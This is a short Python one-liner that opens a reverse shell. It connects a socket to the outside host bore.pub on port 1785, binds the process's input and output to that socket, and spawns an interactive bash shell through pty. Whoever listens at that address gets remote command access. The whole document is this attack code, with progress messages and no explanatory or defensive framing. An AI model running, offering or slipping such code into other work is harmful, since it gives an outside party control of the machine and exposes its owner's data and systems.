python3 -c "
import socket, subprocess, os, pty

HOST = 'bore.pub'
PORT = 1785

print(f'[+] Connecting to {HOST}:{PORT}...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print('[+] Connected! Spawning PTY shell...')

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn('/bin/bash')
"
